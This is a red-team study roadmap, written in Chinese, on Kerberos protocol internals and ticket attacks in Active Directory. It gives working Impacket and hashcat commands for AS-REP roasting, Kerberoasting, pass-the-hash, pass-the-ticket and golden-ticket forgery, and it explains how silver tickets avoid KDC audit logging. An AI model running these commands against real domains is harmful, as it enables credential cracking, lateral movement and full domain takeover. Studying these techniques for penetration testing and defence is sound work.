# 🎫 Kerberos 協定本質、票據攻擊與偽造深度學習路徑 (Kerberos & Ticket Forgery)
> 對應紅隊作戰矩陣：**Phase 3 (R07)** (R07.1 ~ R07.7)  
> 預計總投入時間：**35 ~ 40 小時**（視 Windows 網域協定、ASN.1 結構與密碼學基礎而定）

---

## 📍 你在哪裡、去哪裡

```
你現在的狀態                         這份路徑帶你到達的位置
──────────────────                   ────────────────────────────
分不清 TGT 與 TGS 差別       ──►     精通 Kerberos 完整三向交換流程與 PAC 授權結構
只會用 Mimikatz 抄指令       ──►     精通 AS-REP Roasting、Kerberoasting 與離線破解
以為拿了 Hash 只能 Pass-Hash ──►     精通 Golden / Silver Ticket 偽造與無敵持久化維持
```

---

## 🧱 第零關：先確認你有這些基礎

| 概念 | 需要了解到的程度 | 快速補充資源 |
|------|-----------------|-------------|
| Kerberos v5 協定規範 | 熟悉 AS-REQ/REP, TGS-REQ/REP, AP-REQ/REP 三大階段 | [IETF RFC 4120: Kerberos V5](https://datatracker.ietf.org/doc/html/rfc4120) |
| 特權屬性憑證 (PAC) | 理解 PAC 簽名、Server Signature、KDC Signature 的防偽機制 | [MS-PAC: Privilege Attribute Certificate](https://learn.microsoft.com/openspecs/windows_protocols/ms-pac/) |
| Active Directory SPN 語意 | 理解服務主體名稱 (Service Principal Name) 與網域帳號綁定 | [Microsoft Learn: SPN 語法與註冊](https://learn.microsoft.com/windows/win32/ad/service-principal-names) |

---

## 🗺️ 整體學習地圖（五個階段）

```
階段一 ──────► 階段二 ──────► 階段三 ──────► 階段四 ──────► 階段五
Kerberos交握   AS-REP/Kerberoast PtH與PtT     黃金票據偽造   白銀票據偽造
(8h)           (10h)          (8h)           (8h)           (6h)
```

---

## 🏛️ 階段一：Kerberos 協定完整交握流程與 PAC 驗證（約 8 小時）

### 1.1 三階段交握時序全景圖
```
[客戶端 Client]               [網域控制站 KDC / AS / TGS]          [目標服務 Server]
       │                                     │                              │
       ├── 1. AS-REQ (使用者身分預認證) ────►│                              │
       │◄── 2. AS-REP (返回 TGT + SessionKey)─┤                              │
       │                                     │                              │
       ├── 3. TGS-REQ (憑 TGT 申請服務票證) ─►│                              │
       │◄── 4. TGS-REP (返回 ST / 服務票證)──┤                              │
       │                                     │                              │
       ├── 5. AP-REQ (向目標服務出示 ST) ───────────────────────────────────►│
       │◄── 6. AP-REP (可選相互驗證) ────────────────────────────────────────┤
```
- **TGT (Ticket Granting Ticket)**：使用 KDC 的 `krbtgt` 帳號 NTLM/AES 金鑰加密。
- **ST (Service Ticket)**：使用目標服務帳號的 NTLM/AES 金鑰加密。

---

## 🥩 階段二：AS-REP Roasting 與 Kerberoasting 攻擊實務（約 10 小時）

### 2.1 AS-REP Roasting (無需任何網域憑證)
當特定網域帳號被配置了 `DONT_REQ_PREAUTH` (不需要預先驗證)：
- 攻擊者直接發送 AS-REQ 請求。
- KDC 毫無防備地回傳使用該使用者密碼 Hash 加密的 SessionKey。
- 攻擊者離線暴力破解該加密塊：
  ```bash
  impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass -dc-ip 192.168.1.10 -format hashcat
  ```

### 2.2 Kerberoasting (需任意低權限網域帳號)
任何網域認證使用者皆可向 KDC 索取任意註冊了 SPN 的服務帳號票證（TGS-REP）：
- 票證由目標服務帳號的密碼 Hash 加密。
- 攻擊者提取票證後在本地使用 GPU 離線字典破解：
  ```bash
  impacket-GetUserSPNs domain.local/user:password -dc-ip 192.168.1.10 -request -outputfile kerberoast_hashes.txt
  hashcat -m 13100 kerberoast_hashes.txt rockyou.txt
  ```

---

## 🔄 階段三：NTLM Pass-the-Hash 與 Kerberos 票據重放 (PtT)（約 8 小時）

### 3.1 Pass-the-Hash (PtH)
利用 NTLM 認證僅校驗密碼 Hash 而不需明文密碼的特性：
```bash
impacket-wmiexec -hashes :e52cac67419a9a22ecb08dc5b887964b Administrator@192.168.1.50
```

### 3.2 Pass-the-Ticket (PtT) 記憶體票據注入
在記憶體中竊取或轉換 Kirbi / CCache 票據並寫入當前環境變數：
```bash
export KRB5CCNAME=/tmp/admin.ccache
impacket-smbclient -k -no-pass //dc01.domain.local/c$
```

---

## 👑 階段四：Kerberos 黃金票據 (Golden Ticket) 偽造（約 8 小時）

### 4.1 物理機制：掌控 krbtgt 即掌控整個網域
TGT 票據由 `krbtgt` 帳號的 Hash 簽署與加密。只要掌握 `krbtgt` 的 NTLM Hash 或 AES 金鑰：
- 攻擊者可自行在離線電腦上偽造**包含 Domain Admins (RID 512) 或 Enterprise Admins (RID 519) 的任意 PAC 授權宣告**！
- 即使目標修改了管理員密碼，黃金票據在有效期限內依然通殺所有機器！
```bash
# 利用 Impacket ticketer.py 生成黃金票據
impacket-ticketer -nthash <krbtgt_hash> -domain-sid S-1-5-21-xxx -domain domain.local Administrator
```

---

## 🥈 階段五：Kerberos 白銀票據 (Silver Ticket) 偽造（約 6 小時）

### 5.1 物理機制：零 KDC 流量的極度隱蔽作戰
白銀票據是偽造的特定服務票證 (ST)：
- 僅需掌握「目標伺服器電腦帳號的 Hash」（例如 `DC01$` 的 Hash）。
- 偽造 CIFS、HOST、LDAP、HTTP 服務的 ST。
- **優勢**：客戶端直接向目標服務出示偽造票證，**全過程完全不與網域控制站 (KDC) 發生任何網路連線**，完全避開 KDC 端的 Event ID 4768 / 4769 審計！

---

## ✅ 本路徑通過檢查表（Checklist）

- [ ] 能在 Wireshark 抓包中精確指出 AS-REQ, AS-REP, TGS-REQ, TGS-REP 的各欄位內容。
- [ ] 能識別 `DONT_REQ_PREAUTH` 標籤並成功執行 AS-REP 離線破解。
- [ ] 熟練使用 Impacket 工具鏈執行全域 Kerberoasting 導出與分析。
- [ ] 掌握 Mimikatz 與 Impacket 偽造黃金票據與注入記憶體的具體命令。
- [ ] 能說明白銀票據與黃金票據在防禦規避（免連線 KDC）上的本質差異。
